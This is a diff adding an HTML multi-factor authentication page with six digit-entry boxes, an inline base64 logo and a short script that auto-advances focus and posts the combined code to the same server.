@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="da">
+<head>
+  <meta charset="UTF-8" />
+  <title>MFA Verification</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom left, #f2fdfb, #c8f1e3);
+    }
+
+    .mfa-box {
+      text-align: center;
+      background: #fcfbfa;
+      padding: 30px 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      max-width: 100px;
+      margin-bottom: 20px;
+      
+      
+
+      }
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px 0;
+    }
+
+    .code-inputs input {
+      width: 40px;
+      height: 50px;
+      font-size: 24px;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .code-inputs input:focus {
+      border-color: #074073;
+      outline: none;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #074073;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #03243e
+    }
+  </style>
+</head>
+<body>
+
+  <div class="mfa-box">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFcAAABuCAYAAABSvY8JAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAV6ADAAQAAAABAAAAbgAAAAAPYzbjAAAGR3RFWHRteGZpbGUAJTNDbXhmaWxlJTIwaG9zdCUzRCUyMmFwcC5kaWFncmFtcy5uZXQlMjIlMjBhZ2VudCUzRCUyMk1vemlsbGElMkY1LjAlMjAoTWFjaW50b3NoJTNCJTIwSW50ZWwlMjBNYWMlMjBPUyUyMFglMjAxMF8xNV83KSUyMEFwcGxlV2ViS2l0JTJGNjA1LjEuMTUlMjAoS0hUTUwlMkMlMjBsaWtlJTIwR2Vja28pJTIwVmVyc2lvbiUyRjE3LjYlMjBTYWZhcmklMkY2MDUuMS4xNSUyMiUyMHZlcnNpb24lM0QlMjIyNy4wLjUlMjIlMjBzY2FsZSUzRCUyMjElMjIlMjBib3JkZXIlM0QlMjIwJTIyJTNFJTBBJTIwJTIwJTNDZGlhZ3JhbSUyMG5hbWUlM0QlMjJTaWRlLTElMjIlMjBpZCUzRCUyMjQwYUNxcnY3NVczY1ljc2dDSkhwJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTNDbXhHcmFwaE1vZGVsJTIwZHglM0QlMjI4MzAlMjIlMjBkeSUzRCUyMjU1NyUyMiUyMGdyaWQlM0QlMjIwJTIyJTIwZ3JpZFNpemUlM0QlMjIxMCUyMiUyMGd1aWRlcyUzRCUyMjElMjIlMjB0b29sdGlwcyUzRCUyMjElMjIlMjBjb25uZWN0JTNEJTIyMSUyMiUyMGFycm93cyUzRCUyMjElMjIlMjBmb2xkJTNEJTIyMSUyMiUyMHBhZ2UlM0QlMjIxJTIyJTIwcGFnZVNjYWxlJTNEJTIyMSUyMiUyMHBhZ2VXaWR0aCUzRCUyMjgyNyUyMiUyMHBhZ2VIZWlnaHQlM0QlMjIxMTY5JTIyJTIwbWF0aCUzRCUyMjAlMjIlMjBzaGFkb3clM0QlMjIwJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDcm9vdCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyMCUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyMSUyMiUyMHBhcmVudCUzRCUyMjAlMjIlMjAlMkYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteENlbGwlMjBpZCUzRCUyMkNzVE5velRIb1pDM1Z2SksybTZrLTMlMjIlMjB2YWx1ZSUzRCUyMiUyMiUyMHN0eWxlJTNEJTIyc2tldGNoJTNEMCUzQnBvaW50ZXJFdmVudHMlM0QxJTNCc2hhZG93JTNEMCUzQmRhc2hlZCUzRDAlM0JodG1sJTNEMSUzQnN0cm9rZUNvbG9yJTNEbm9uZSUzQmZpbGxDb2xvciUzRCUyMzUwNTA1MCUzQmxhYmVsUG9zaXRpb24lM0RjZW50ZXIlM0J2ZXJ0aWNhbExhYmVsUG9zaXRpb24lM0Rib3R0b20lM0J2ZXJ0aWNhbEFsaWduJTNEdG9wJTNCb3V0bGluZUNvbm5lY3QlM0QwJTNCYWxpZ24lM0RjZW50ZXIlM0JzaGFwZSUzRG14Z3JhcGgub2ZmaWNlLnNlY3VyaXR5LmxvY2tfd2l0aF9rZXlfc2VjdXJpdHlfYmx1ZSUzQiUyMiUyMHZlcnRleCUzRCUyMjElMjIlMjBwYXJlbnQlM0QlMjIxJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhHZW9tZXRyeSUyMHglM0QlMjIzNTAlMjIlMjB5JTNEJTIyMjAwJTIyJTIwd2lkdGglM0QlMjI4NyUyMiUyMGhlaWdodCUzRCUyMjExMCUyMiUyMGFzJTNEJTIyZ2VvbWV0cnklMjIlMjAlMkYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZteENlbGwlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZyb290JTNFJTBBJTIwJTIwJTIwJTIwJTNDJTJGbXhHcmFwaE1vZGVsJTNFJTBBJTIwJTIwJTNDJTJGZGlhZ3JhbSUzRSUwQSUzQyUyRm14ZmlsZSUzRSUwQTKPlcwAAAxPSURBVHgB7Z0PcBVHHcdv770klD8JGRv5UyAJ/ikUOrSWdioCBih9SUoCIYaCio5VUdva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
+" alt="Company Logo" class="logo">
+    
+    <h2>Multi-Factor Authentication</h2>
+    <p>Enter the 6-digit code from your authenticator app.</p>
+    <form method="post" onsubmit="return collectCode()">
+      <div class="code-inputs">
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+      </div>
+      <!-- Skjult felt der samler koden -->
+      <input type="hidden" name="code" id="fullCode">
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+
+  <script>
+    // Autofokus videre til næste felt
+    document.querySelectorAll('.code-inputs input').forEach((input, index, inputs) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+    });
+
+    // Saml koden før submit
+    function collectCode() {
+      const inputs = document.querySelectorAll('.code-inputs input');
+      const code = Array.from(inputs).map(input => input.value).join('');
+      document.getElementById('fullCode').value = code;
+      return true;
+    }
+  </script>
+
+</body>
+</html>
